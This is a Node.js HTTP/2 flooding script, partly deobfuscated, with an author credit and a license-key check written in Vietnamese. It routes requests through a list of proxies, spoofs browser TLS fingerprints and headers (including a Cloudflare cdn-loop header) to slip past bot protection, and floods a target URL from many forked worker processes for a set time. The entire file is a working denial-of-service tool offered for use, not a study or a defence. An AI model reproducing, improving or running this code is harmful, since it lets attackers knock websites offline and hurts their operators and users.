// Decode By OnlyTris
// Shit Method Copy Github
const net = require('net'),
  http2 = require('http2'),
  tls = require('tls'),
  cluster = require('cluster'),
  url = require('url'),
  crypto = require('crypto'),
  fs = require('fs'),
  scp = require('set-cookie-parser');
var colors = require('colors');
const randomUseragent = require('random-useragent'),
  uap = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9', 'Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240', 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0', 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.62', 'Mozilla/5.0 (Linux; Android 12; POCO F1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; W-K130-TMV Build/OPM2.171019.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4.4.2; MITO T10 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; moto g(7) plus Build/QPWS30.61-21-18-7; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; SM-G800H Build/PQ3A.190801.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.114 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; TECNO AB7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; 6.0; Nomi i5010) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; moto g stylus 5G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; SAMSUNG moto g stylus 5G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 3.2; en-us; Sony Tablet S Build/THMAS11000) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13', 'Mozilla/5.0 (Linux; Android 7.1.1; SM-J510MN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.166 Mobile Safari/537.36 OPR/65.2.3381.61420', 'Mozilla/5.0 (Linux; Android 8.0.0; SM-G930R4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/118.0.5993.69 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/112.0.5615.46 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Linux; Android 11; Infinix X689C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v4504021560267656607 t3426302838546509975 ath1fb31b7a altpriv cvcv=2 smf=0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v5534684115277472898 t3426302838546509975 ath1fb31b7a altpriv cvcv=2 smf=0', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1'],
  accept_header = ['text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'],
  cache_header = ['max-age=0', 'no-cache', 'no-store', 'pre-check=0', 'post-check=0', 'must-revalidate', 'proxy-revalidate', 's-maxage=604800', 'no-cache, no-store,private, max-age=0, must-revalidate', 'no-cache, no-store,private, s-maxage=604800, must-revalidate', 'no-cache, no-store,private, max-age=604800, must-revalidate'],
  Generate_Encoding = ['*', 'gzip, deflate', 'br;q=1.0, gzip;q=0.8, *;q=0.1', 'gzip', 'gzip, compress', 'compress, deflate', 'compress', 'gzip, deflate, br', 'deflate'],
  language_header = ['he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7', 'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5', 'en-US,en;q=0.5', 'en-US,en;q=0.9', 'de-CH;q=0.7', 'da, en-gb;q=0.8, en;q=0.7', 'cs;q=0.5', 'nl-NL,nl;q=0.9', 'nn-NO,nn;q=0.9', 'or-IN,or;q=0.9', 'pa-IN,pa;q=0.9', 'pl-PL,pl;q=0.9', 'pt-BR,pt;q=0.9', 'pt-PT,pt;q=0.9', 'ro-RO,ro;q=0.9', 'ru-RU,ru;q=0.9', 'si-LK,si;q=0.9', 'sk-SK,sk;q=0.9', 'sl-SI,sl;q=0.9', 'sq-AL,sq;q=0.9', 'sr-Cyrl-RS,sr;q=0.9', 'sr-Latn-RS,sr;q=0.9', 'sv-SE,sv;q=0.9', 'sw-KE,sw;q=0.9', 'ta-IN,ta;q=0.9', 'te-IN,te;q=0.9', 'th-TH,th;q=0.9', 'tr-TR,tr;q=0.9', 'uk-UA,uk;q=0.9', 'ur-PK,ur;q=0.9', 'uz-Latn-UZ,uz;q=0.9', 'vi-VN,vi;q=0.9', 'zh-CN,zh;q=0.9', 'zh-HK,zh;q=0.9', 'zh-TW,zh;q=0.9', 'am-ET,am;q=0.8', 'as-IN,as;q=0.8', 'az-Cyrl-AZ,az;q=0.8', 'bn-BD,bn;q=0.8', 'bs-Cyrl-BA,bs;q=0.8', 'bs-Latn-BA,bs;q=0.8', 'dz-BT,dz;q=0.8', 'fil-PH,fil;q=0.8', 'fr-CA,fr;q=0.8', 'fr-CH,fr;q=0.8', 'fr-BE,fr;q=0.8', 'fr-LU,fr;q=0.8', 'gsw-CH,gsw;q=0.8', 'ha-Latn-NG,ha;q=0.8', 'hr-BA,hr;q=0.8', 'ig-NG,ig;q=0.8', 'ii-CN,ii;q=0.8', 'is-IS,is;q=0.8', 'jv-Latn-ID,jv;q=0.8', 'ka-GE,ka;q=0.8', 'kkj-CM,kkj;q=0.8', 'kl-GL,kl;q=0.8', 'km-KH,km;q=0.8', 'kok-IN,kok;q=0.8', 'ks-Arab-IN,ks;q=0.8', 'lb-LU,lb;q=0.8', 'ln-CG,ln;q=0.8', 'mn-Mong-CN,mn;q=0.8', 'mr-MN,mr;q=0.8', 'ms-BN,ms;q=0.8', 'mt-MT,mt;q=0.8', 'mua-CM,mua;q=0.8', 'nds-DE,nds;q=0.8', 'ne-IN,ne;q=0.8', 'nso-ZA,nso;q=0.8', 'oc-FR,oc;q=0.8', 'pa-Arab-PK,pa;q=0.8', 'ps-AF,ps;q=0.8', 'quz-BO,quz;q=0.8', 'quz-EC,quz;q=0.8', 'quz-PE,quz;q=0.8', 'rm-CH,rm;q=0.8', 'rw-RW,rw;q=0.8', 'sd-Arab-PK,sd;q=0.8', 'se-NO,se;q=0.8', 'si-LK,si;q=0.8', 'smn-FI,smn;q=0.8', 'sms-FI,sms;q=0.8', 'syr-SY,syr;q=0.8', 'tg-Cyrl-TJ,tg;q=0.8', 'ti-ER,ti;q=0.8', 'tk-TM,tk;q=0.8', 'tn-ZA,tn;q=0.8', 'tt-RU,tt;q=0.8', 'ug-CN,ug;q=0.8', 'uz-Cyrl-UZ,uz;q=0.8', 've-ZA,ve;q=0.8', 'wo-SN,wo;q=0.8', 'xh-ZA,xh;q=0.8', 'yo-NG,yo;q=0.8', 'zgh-MA,zgh;q=0.8', 'zu-ZA,zu;q=0.8'],
  dest_header = ['audio', 'audioworklet', 'document', 'embed', 'empty', 'font', 'frame', 'iframe', 'image', 'manifest', 'object', 'paintworklet', 'report', 'script', 'serviceworker', 'sharedworker', 'style', 'track', 'video', 'worker', 'xslt'],
  platform = ['Windows', 'Linux', 'iPhone'],
  mode_header = ['cors', 'navigate', 'no-cors', 'same-origin', 'websocket'],
  site_header = ['cross-site', 'same-origin', 'same-site', 'none'],
  sec_ch_ua = ['"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"', '"Not.A/Brand";v="8", "Chromium";v="114", "Brave";v="114"'];
process['setMaxListeners'](0), require('events')['EventEmitter']['defaultMaxListeners'] = 0;
process['argv']['length'] < 7 && (console['log']('Usage: host time req thread GET proxy.txt'), process['exit']());
const defaultCiphers = crypto['constants']['defaultCoreCipherList']['split'](':'),
  ciphers = 'GREASE:' + [defaultCiphers[2], defaultCiphers[1], defaultCiphers[0], ...defaultCiphers['slice'](3)]['join'](':'),
  sigalgs = ['ecdsa_secp256r1_sha256', 'ecdsa_secp384r1_sha384', 'ecdsa_secp521r1_sha512', 'rsa_pss_rsae_sha256', 'rsa_pss_rsae_sha384', 'rsa_pss_rsae_sha512', 'rsa_pkcs1_sha256', 'rsa_pkcs1_sha384', 'rsa_pkcs1_sha512'];
let SignalsList = sigalgs['join'](':');
const ecdhCurve = 'GREASE:X25519:x25519',
  secureOptions = crypto['constants']['SSL_OP_NO_SSLv2'] | crypto['constants']['SSL_OP_NO_SSLv3'] | crypto['constants']['SSL_OP_NO_TLSv1'] | crypto['constants']['SSL_OP_NO_TLSv1_1'] | crypto['constants']['ALPN_ENABLED'] | crypto['constants']['SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION'] | crypto['constants']['SSL_OP_CIPHER_SERVER_PREFERENCE'] | crypto['constants']['SSL_OP_LEGACY_SERVER_CONNECT'] | crypto['constants']['SSL_OP_COOKIE_EXCHANGE'] | crypto['constants']['SSL_OP_PKCS1_CHECK_1'] | crypto['constants']['SSL_OP_PKCS1_CHECK_2'] | crypto['constants']['SSL_OP_SINGLE_DH_USE'] | crypto['constants']['SSL_OP_SINGLE_ECDH_USE'] | crypto['constants']['SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION'],
  secureProtocol = 'TLS_client_method',
  headers = {},
  _0x95b7da = {};
_0x95b7da['ciphers'] = ciphers, _0x95b7da['sigalgs'] = SignalsList, _0x95b7da['honorCipherOrder'] = true, _0x95b7da['secureOptions'] = secureOptions, _0x95b7da['secureProtocol'] = secureProtocol;
const secureContextOptions = _0x95b7da,
  secureContext = tls['createSecureContext'](secureContextOptions),
  _0x3f4189 = {};
_0x3f4189['target'] = process['argv'][2], _0x3f4189['time'] = ~~process['argv'][3], _0x3f4189['Rate'] = ~~process['argv'][4], _0x3f4189['threads'] = ~~process['argv'][5], _0x3f4189['method'] = ~~process['argv'][6], _0x3f4189['proxyFile'] = process['argv'][7];
const args = _0x3f4189,
  moment = require('moment'),
  _0xb20668 = {};
_0xb20668['FreeAccessFile1Weak'] = '2099-10-30';
const keysDatabase = _0xb20668;
function maskKey(_0x14b7b9) {
  if (_0x14b7b9['length'] <= 2) return _0x14b7b9;
  const _0x259a1b = _0x14b7b9['slice'](0, 5);
  const _0x26efde = '*'['repeat'](_0x14b7b9['length'] - 5);
  return _0x259a1b + _0x26efde;
}
function getKeyExpiryInfo(_0x20edd8) {
  if (!keysDatabase[_0x20edd8]) {
    const _0x3e90c8 = {};
    return _0x3e90c8['error'] = 'Key sai rồi. Đừng cố dò key!', _0x3e90c8;
  }
  const _0xa0e608 = keysDatabase[_0x20edd8],
    _0x4ad5ee = moment(_0xa0e608, 'YYYY-MM-DD'),
    _0x2e253d = moment();
  if (_0x2e253d['isAfter'](_0x4ad5ee, 'month')) {
    const _0x45810b = {};
    return _0x45810b['expired'] = true, _0x45810b['monthsRemaining'] = 0x0, _0x45810b['daysRemaining'] = 0x0, _0x45810b['hoursRemaining'] = 0x0, _0x45810b['minutesRemaining'] = 0x0, _0x45810b;
  }
  let _0x142490 = _0x4ad5ee['diff'](_0x2e253d),
    _0x3023ad = Math['floor'](_0x142490 / 2592000000);
  _0x142490 -= _0x3023ad * 2592000000;
  let _0x59b556 = Math['floor'](_0x142490 / 86400000);
  _0x142490 -= _0x59b556 * 86400000;
  let _0x10a9c2 = Math['floor'](_0x142490 / 3600000);
  _0x142490 -= _0x10a9c2 * 3600000;
  let _0xf69f63 = Math['floor'](_0x142490 / 60000);
  const _0x3e0581 = {};
  _0x3e0581['expired'] = false, _0x3e0581['monthsRemaining'] = _0x3023ad, _0x3e0581['daysRemaining'] = _0x59b556;
  return _0x3e0581['hoursRemaining'] = _0x10a9c2, _0x3e0581['minutesRemaining'] = _0xf69f63, _0x3e0581;
}
const argsed = process['argv']['slice'](8),
  keyArg = argsed['find'](_0x195813 => _0x195813['startsWith']('key='));
!keyArg && (console['error']('Vui lòng cung cấp key bằng cách sử dụng định dạng key=VALUE'), process['exit'](1));
const key = keyArg['split']('=')[1],
  maskedKey = maskKey(key),
  info = getKeyExpiryInfo(key);
if (info['error']) console['log']('' + info['error']);else {
  if (info['expired']) console['log']('Key ' + maskedKey + ': Đã hết hạn');else {}
}
var proxies = readLines(args['proxyFile']);
const parsedTarget = url['parse'](args['target']);
if (cluster['isMaster']) {
  for (let counter = 1; counter <= args['threads']; counter++) {
    cluster['fork']();
  }
  const proxyList = readLines(args['proxyFile']);
  console['clear'](), console['log'](('Key ' + maskedKey + ' - Expired in ' + info['monthsRemaining'] + 'm, ' + info['daysRemaining'] + 'd, ' + info['hoursRemaining'] + 'h, ' + info['minutesRemaining'] + 'min')['rainbow']), console['log']('Script Made By NcKx | @nck0666/.enc_kay168'['rainbow']), console['log']('[33mTarget: [0m' + process['argv'][2]), console['log']('[33mTime: [0m' + process['argv'][3]), console['log']('[33mRate: [0m' + process['argv'][4]), console['log']('[33mThread(s): [0m' + process['argv'][5]), console['log']('[33mProxyFile: [0m' + process['argv'][7] + ' | [33mTotal(s): [0m' + proxyList['length']);
} else for (let i = 0; i < 10; i++) {
  setInterval(runFlooder, 0);
}
class NetSocket {
  constructor() {}
  ['HTTP'](_0x1f1680, _0x29e0d4) {
    const _0x4eee34 = _0x1f1680['address']['split'](':');
    const _0x1a5a17 = _0x4eee34[0],
      _0x21ae54 = 'CONNECT ' + _0x1f1680['address'] + ':443 HTTP/1.1\r\nHost: ' + _0x1f1680['address'] + ':443\r\nConnection: Keep-Alive\r\n\r\n',
      _0x4c7fbf = new Buffer['from'](_0x21ae54),
      _0xa0de91 = {};
    _0xa0de91['host'] = _0x1f1680['host'], _0xa0de91['port'] = _0x1f1680['port'], _0xa0de91['allowHalfOpen'] = true, _0xa0de91['writable'] = true, _0xa0de91['readable'] = true;
    const _0x5d4714 = net['connect'](_0xa0de91);
    _0x5d4714['setTimeout'](_0x1f1680['timeout'] * 15000);
    _0x5d4714['setKeepAlive'](true, 15000), _0x5d4714['setNoDelay'](true), _0x5d4714['on']('connect', () => {
      _0x5d4714['write'](_0x4c7fbf);
    }), _0x5d4714['on']('data', _0x1c4f29 => {
      const _0x63d104 = _0x1c4f29['toString']('utf-8'),
        _0x1e2a26 = _0x63d104['includes']('HTTP/1.1 200');
      if (_0x1e2a26 === false) return _0x5d4714['destroy'](), _0x29e0d4(undefined, '403');
      return _0x29e0d4(_0x5d4714, undefined);
    }), _0x5d4714['on']('timeout', () => {
      _0x5d4714['destroy']();
      return _0x29e0d4(undefined, '403');
    }), _0x5d4714['on']('error', _0x543c20 => {
      return _0x5d4714['destroy'](), _0x29e0d4(undefined, '403');
    });
  }
}
function cookieString(_0x55a331) {
  var _0x434fe5 = '';
  for (var _0x28363e in _0x55a331) {
    _0x434fe5 = _0x434fe5 + ' ' + _0x55a331[_0x28363e]['name'] + '=' + _0x55a331[_0x28363e]['value'] + ';';
  }
  var _0x434fe5 = _0x434fe5['substring'](1);
  return _0x434fe5['substring'](0, _0x434fe5['length'] - 1);
}
const Socker = new NetSocket();
function readLines(_0x482107) {
  return fs['readFileSync'](_0x482107, 'utf-8')['toString']()['split'](/\r?\n/);
}
function randomIntn(_0x49ed2e, _0x240d57) {
  return Math['floor'](Math['random']() * (_0x240d57 - _0x49ed2e) + _0x49ed2e);
}
function randomElement(_0x5b952f) {
  return _0x5b952f[randomIntn(0, _0x5b952f['length'])];
}
function runFlooder() {
  const _0x4016e8 = randomElement(proxies),
    _0x37bc98 = _0x4016e8['split'](':'),
    _0x168dd9 = parsedTarget['protocol'] == 'https:' ? '443' : '80';
  let _0x3c17e3 = randomUseragent['getRandom'](function (_0x286039) {
      return _0x286039['browserName'] === 'Firefox';
    }),
    _0x406512 = {
      ':authority': parsedTarget['host'],
      ':method': 'GET',
      'pragma': 'no-cache',
      ':path': parsedTarget['path'],
      ':scheme': parsedTarget['protocol'] == 'https:' ? 'https' : 'http',
      'Accept': accept_header[Math['floor'](Math['random']() * accept_header['length'])],
      'accept-encoding': Generate_Encoding[Math['floor'](Math['random']() * Generate_Encoding['length'])],
      'accept-language': language_header[Math['floor'](Math['random']() * language_header['length'])],
      'cache-control': cache_header[Math['floor'](Math['random']() * cache_header['length'])],
      'origin': parsedTarget['protocol'] + '//' + parsedTarget['host'],
      'referer': parsedTarget['href'],
      'sec-ch-ua': sec_ch_ua[Math['floor'](Math['random']() * sec_ch_ua['length'])],
      'sec-ch-ua-mobile': '?0',
      'priority': 'u=0, 1',
      'sec-ch-ua-platform': platform[Math['floor'](Math['random']() * platform['length'])],
      'sec-fetch-dest': dest_header[Math['floor'](Math['random']() * dest_header['length'])],
      'sec-fetch-mode': mode_header[Math['floor'](Math['random']() * mode_header['length'])],
      'sec-fetch-site': site_header[Math['floor'](Math['random']() * site_header['length'])],
      'sec-fetch-user': '?1',
      'upgrade-insecure-requests': 0x1,
      'user-agent': uap[Math['floor'](Math['floor'](Math['random']() * uap['length']))],
      'x-requested-with': 'XMLHttpRequest',
      'cdn-loop': 'cloudflare',
      'x-forwareded-proto': 'https'
    };
  const _0x4927d7 = {};
  _0x4927d7['host'] = _0x37bc98[0];
  _0x4927d7['port'] = ~~_0x37bc98[1];
  _0x4927d7['address'] = parsedTarget['host'] + ':443', _0x4927d7['timeout'] = 0x64;
  const _0x1a901f = _0x4927d7;
  Socker['HTTP'](_0x1a901f, (_0x402931, _0x16853d) => {
    if (_0x16853d) return;
    _0x402931['setKeepAlive'](true, 200000), _0x402931['setNoDelay'](true);
    const _0x45831b = {};
    _0x45831b['enablePush'] = false, _0x45831b['initialWindowSize'] = 0x3fffffff;
    const _0x5ba557 = _0x45831b;
    const _0x2f3ba3 = {};
    _0x2f3ba3['port'] = _0x168dd9, _0x2f3ba3['secure'] = true, _0x2f3ba3['ALPNProtocols'] = ['h2', 'spdy/3.1', 'http/1.1'];
    _0x2f3ba3['ciphers'] = ciphers, _0x2f3ba3['sigalgs'] = sigalgs, _0x2f3ba3['requestCert'] = true, _0x2f3ba3['socket'] = _0x402931, _0x2f3ba3['ecdhCurve'] = ecdhCurve, _0x2f3ba3['honorCipherOrder'] = false, _0x2f3ba3['host'] = parsedTarget['host'], _0x2f3ba3['rejectUnauthorized'] = false, _0x2f3ba3['clientCertEngine'] = 'dynamic', _0x2f3ba3['secureOptions'] = secureOptions, _0x2f3ba3['secureContext'] = secureContext, _0x2f3ba3['servername'] = parsedTarget['host'], _0x2f3ba3['secureProtocol'] = secureProtocol;
    const _0xcb1f79 = _0x2f3ba3,
      _0x5b61b8 = tls['connect'](_0x168dd9, parsedTarget['host'], _0xcb1f79);
    _0x5b61b8['allowHalfOpen'] = true, _0x5b61b8['setNoDelay'](true), _0x5b61b8['setKeepAlive'](true, 600000), _0x5b61b8['setMaxListeners'](0);
    const _0x23e2dd = {};
    _0x23e2dd['headerTableSize'] = 0x10000, _0x23e2dd['maxConcurrentStreams'] = 0x3e8, _0x23e2dd['initialWindowSize'] = 0x600000, _0x23e2dd['maxHeaderListSize'] = 0x40000, _0x23e2dd['enablePush'] = false;
    const _0x55cc4c = {};
    _0x55cc4c['protocol'] = 'https:', _0x55cc4c['settings'] = _0x23e2dd, _0x55cc4c['maxSessionMemory'] = 0xd05, _0x55cc4c['maxDeflateDynamicTableSize'] = 0xffffffff, _0x55cc4c['createConnection'] = () => _0x5b61b8, _0x55cc4c['socket'] = _0x402931;
    const _0xec9fd6 = http2['connect'](parsedTarget['href'], _0x55cc4c),
      _0x1cf151 = {};
    _0x1cf151['headerTableSize'] = 0x10000, _0x1cf151['maxConcurrentStreams'] = 0x3e8, _0x1cf151['initialWindowSize'] = 0x600000, _0x1cf151['maxHeaderListSize'] = 0x40000, _0x1cf151['enablePush'] = false, _0xec9fd6['settings'](_0x1cf151), _0xec9fd6['setMaxListeners'](0), _0xec9fd6['settings'](_0x5ba557), _0xec9fd6['on']('connect', () => {
      const _0x3afa03 = setInterval(() => {
        for (let _0x236afd = 0; _0x236afd < args['Rate']; _0x236afd++) {
          _0x406512['referer'] = 'https://' + parsedTarget['host'] + parsedTarget['path'];
          const _0x56e59d = _0xec9fd6['request'](_0x406512)['on']('response', _0x3d7699 => {
            _0x3d7699['set-cookie'] && (_0x406512['cookie'] = cookieString(scp['parse'](_0x3d7699['set-cookie'])));
            _0x56e59d['close'](), _0x56e59d['destroy']();
            return;
          });
          _0x56e59d['end']();
        }
      }, 1000);
    }), _0xec9fd6['on']('close', () => {
      _0xec9fd6['destroy'](), _0x402931['destroy']();
      return;
    }), _0xec9fd6['on']('error', _0x4112e0 => {
      _0xec9fd6['destroy'](), _0x402931['destroy']();
      return;
    });
  });
}
const StopScript = () => process['exit'](1);
setTimeout(StopScript, args['time'] * 1000), process['on']('uncaughtException', _0x2b92aa => {}), process['on']('unhandledRejection', _0x19497c => {});